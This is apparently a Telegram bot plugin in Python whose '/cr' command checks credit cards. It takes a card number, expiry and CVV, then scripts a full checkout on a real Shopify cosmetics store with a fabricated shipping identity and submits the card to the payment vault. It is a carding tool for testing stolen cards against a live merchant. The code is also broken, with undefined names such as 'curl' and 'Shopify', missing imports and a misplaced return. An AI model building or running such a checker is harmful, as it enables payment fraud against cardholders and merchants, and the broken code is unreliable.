import json
import requests
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 


from datos import idchat

@Client.on_message(filters.command(["cr"], ["/", "."]))
async def cr(_, message: Message):
    
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/cr card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/cr card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
                
            r1 = curl.get('https://www.beautycreationscosmetics.com/collections/new-arrivals/products/stay-cool-handheld-fan-purple')
            variantId = Shopify.find_between(r1.text, 'variantId":',',')
            if not variantId:
            	 print('No variante id')
            return
            	
            headers = {
            	  'accept': 'application/json, text/javascript, */*; q=0.01',
            	  'content-type': 'application/json, application/json',
            	  'origin': 'https://www.beautycreationscosmetics.com',
            	  'referer': 'https://www.beautycreationscosmetics.com/collections/new-arrivals/products/stay-cool-handheld-fan-purple',
            	  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            	  'x-requested-with': 'XMLHttpRequest',
            	  
            	}
            data = {"form_type":"product","utf8":"✓","id":variantId,"quantity":"1","discount":" "}
            r2 = curl.post('https://www.beautycreationscosmetics.com/cart/add.js', headers=headers, json=data)
            	
            headers = {
            	  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            	  "content-type": "application/x-www-form-urlencoded",
            	  "origin": "https://www.beautycreationscosmetics.com",
            	  "referer": "https://www.beautycreationscosmetics.com/cart",
            	  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
            	  
            	}
            data = {
            	  "updates[]": "1",
            	  "note": "",
            	  "checkout": "Check Out",
            	  "discount": "", 
            	  
            	}
            r12 = curl.post('https://www.beautycreationscosmetics.com/cart', headers=headers, data=data)
            ur = (r12.url)
            url = (ur[:-10])
            id1 = ur[41:49]
            id2 = url[60:]
            	
            r13 = curl.get(url)
            soup = BeautifulSoup(r13.text, 'html.parser')
            div_tag = soup.find('div', {'class': 'step'})
            auth_token = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
            if not auth_token:
            	 with open('auth_token.html', 'w') as f: f.write(r13.text)
            	  
            headers = {
            	  
            	  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            	  "Content-Type": "application/x-www-form-urlencoded",
            	  "Host": "www.beautycreationscosmetics.com",
            	  "Origin": "https://www.beautycreationscosmetics.com",
            	  "Referer": "https://www.beautycreationscosmetics.com/",
            	  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
              
            }
            data = {
			          "_method": "patch",
			          "authenticity_token": auth_token,
			          "previous_step": "contact_information",
			          "step": "shipping_method",
			          "checkout[email]": email,
			        "checkout[buyer_accepts_marketing]": "0",
			        "checkout[buyer_accepts_marketing]": "1",
			        "checkout[pick_up_in_store][selected]": "false",
			          "checkout[id]": "delivery-shipping",
			        "checkout[shipping_address][first_name]": "",
			        "checkout[shipping_address][last_name]": "",
			        "checkout[shipping_address][company]": "",
			        "checkout[shipping_address][address1]": "",
			        "checkout[shipping_address][address2]": "",
			        "checkout[shipping_address][city]": "",
			        "checkout[shipping_address][country]": "",
			        "checkout[shipping_address][province]": "",
			        "checkout[shipping_address][zip]": "",
			        "checkout[shipping_address][phone]": "",
			        "checkout[shipping_address][country]": "United States",
			        "checkout[shipping_address][first_name]": name,
			        "checkout[shipping_address][last_name]": second,
			        "checkout[shipping_address][company]": "",
			        "checkout[shipping_address][address1]": "8241 Northwest 66th Street",
			        "checkout[shipping_address][address2]": "",
			        "checkout[shipping_address][city]": "Miami",
			        "checkout[shipping_address][province]": "FL",
        			"checkout[shipping_address][zip]": "33166",
        			"checkout[shipping_address][phone]": "(306) 363-"+num4,
        			"checkout[client_details][browser_width]": "858",
        			"checkout[client_details][browser_height]": "781",
        			"checkout[client_details][javascript_enabled]": "1",
        			"checkout[client_details][color_depth]": "24",
        			"checkout[client_details][java_enabled]": "false",
        			"checkout[client_details][browser_tz]": "0",
              
            }
            r14 = curl.post(url, headers=headers, data=data)
            url2 = r14.url
            
            r15 = curl.get(url2)
            soup = BeautifulSoup(r15.text, 'html.parser')
            div_tag = soup.find('div', {'class': 'step'})
            auth_token2 = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
            
            headers = {
        		  'Accept': '*/*',
        			'Host': 'www.beautycreationscosmetics.com',
        			'Referer': 'https://www.beautycreationscosmetics.com/',
        			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        			'X-Requested-With': 'XMLHttpRequest',
              
            }
            r16 = curl.get(url+'/shipping_rates?step=shipping_method', headers=headers)
            enc = str(r16.text.encode('utf-8'))
            shipping = Shopify.find_between(r16.text, 'data-shipping-method="','"')
            
            
            headers = {
        			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        			"Content-Type": "application/x-www-form-urlencoded",
        			"Host": "www.beautycreationscosmetics.com",
        			"Origin": "https://www.beautycreationscosmetics.com",
        			"Referer": "https://www.beautycreationscosmetics.com/",
        			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
              
            }
            
            data = {
        			"_method": "patch",
        			"authenticity_token": auth_token2,
        			"previous_step": "shipping_method",
        			"step": "payment_method",
        			"checkout[shipping_rate][id]": "Easyship-13a2e96c-5c98-48fe-86cb-c27d7a3dc2e8;DDU-4.53" if not shipping else shipping,
        			"checkout[client_details][browser_width]": "947",
        			"checkout[client_details][browser_height]": "781",
        			"checkout[client_details][javascript_enabled]": "1",
        			"checkout[client_details][color_depth]": "24",
        			"checkout[client_details][java_enabled]": "false",
        			"checkout[client_details][browser_tz]": "0",
              
            }
            r17 = curl.post(url, headers=headers, data=data)
            url3 = r17.url
            
            r18 = curl.get(url3)
            auth_token3 = Shopify.find_between(r18.text, 'type="hidden" name="authenticity_token" value="','"')
            
            r19 = curl.get(url+'?step=payment_method')
            soup = BeautifulSoup(r19.text, 'html.parser')
            div_tag = soup.find('div', {'class': 'step'})
            auth_token4 = div_tag.find('input', {'name': 'authenticity_token'}).get('value')
            
            headers = {
        			"Accept": "application/json",
        			"Content-Type": "application/json",
        			"Host": "deposit.us.shopifycs.com",
        			"Origin": "https://checkout.shopifycs.com",
        			"Referer": "https://checkout.shopifycs.com/",
        			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
              
            }
            data = {"credit_card":{"number":ccr,"name":name+" "+second,"month":int(mes1),"year":int(ano1),"verification_value":str(cvv1)},"payment_session_scope":"www.beautycreationscosmetics.com"}
            r20 = curl.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=data)
            id = r20.json()['id']
            
            headers = {
        			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        			"Content-Type": "application/x-www-form-urlencoded",
        			"Host": "www.beautycreationscosmetics.com",
        			"Origin": "https://www.beautycreationscosmetics.com",
        			"Referer": "https://www.beautycreationscosmetics.com/",
        			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
              
            }
            data = {
        			"_method": "patch",
        			"authenticity_token": auth_token4,
        			"previous_step": "payment_method",
        			"step": "",
        			"s": id,
        			"checkout[payment_gateway]": "100636614",
        			"checkout[credit_card][vault]": "false",
        			"checkout[different_billing_address]": "false",
        			"checkout[remember_me]": "false",
        			"checkout[remember_me]": "0",
        			"checkout[vault_phone]": "+1306363"+num4,
        			"checkout[total_price]": "1253",
        			"complete": "1",
        			"checkout[client_details][browser_width]": "930",
        			"checkout[client_details][browser_height]": "781",
        			"checkout[client_details][javascript_enabled]": "1",
        			"checkout[client_details][color_depth]": "24",
        			"checkout[client_details][java_enabled]": "false",
        			"checkout[client_details][browser_tz]": "0",
              
            }
            r21 = curl.post(url, headers=headers, data=data)
            auth_token5 = Shopify.find_between(r21.text, 'type="hidden" name="authenticity_token" value="','"')
            headers = {
        			"Accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        			"Content-Type": 'application/x-www-form-urlencoded',
        			"Host": 'www.beautycreationscosmetics.com',
        			"Origin": 'https://www.beautycreationscosmetics.com',
        			"Referer": 'https://www.beautycreationscosmetics.com/',
        			"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
              
            }
            data = {
        			"_method": "patch",
        			"authenticity_token": auth_token5,
        			"checkout[total_price]": "1253",
        			"complete": "1",
        			"checkout[client_details][browser_width]": "947",
        			"checkout[client_details][browser_height]": "781",
        			"checkout[client_details][javascript_enabled]": "1",
        			"checkout[client_details][color_depth]": "24",
        			"checkout[client_details][java_enabled]": "false",
        			"checkout[client_details][browser_tz]": "0",
              
            }
            r22 = curl.post(url, headers=headers, data=data)
            
            r23 = curl.get(url+'/processing')
            curl.close()
            print(r23.text)
            
            
            
                 